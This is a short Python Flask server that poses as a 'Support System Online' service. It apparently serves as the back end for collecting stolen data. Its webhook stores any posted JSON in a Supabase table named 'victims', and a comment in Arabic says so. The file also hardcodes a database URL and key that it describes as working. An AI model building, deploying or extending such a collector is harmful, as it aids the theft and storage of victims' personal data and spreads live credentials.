import os
from flask import Flask, jsonify, request
from supabase import create_client, Client

app = Flask(__name__)

# Credentials verified and working
URL = "https://bozherhsarcovutvproa.supabase.co"
KEY = "sb_publishable_WgwSb3OjPOv1KOvPK7SJ7A_4u6UDIYY"
supabase: Client = create_client(URL, KEY)

@app.route('/')
def home():
    return jsonify({"status": "active", "message": "Support System Online"})

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        data = request.json
        if not data:
            return jsonify({"success": False, "error": "No data received"}), 400

        # حفظ البيانات في جدول victims
        response = supabase.table('victims').insert({"victim_data": data}).execute()
        
        return jsonify({
            "success": True,
            "message": "Data saved successfully",
            "db_id": response.data[0]['id'] if response.data else None
        })
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

@app.route('/test-db')
def test_db():
    return jsonify({"success": True, "message": "System connected and ready to save!"})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
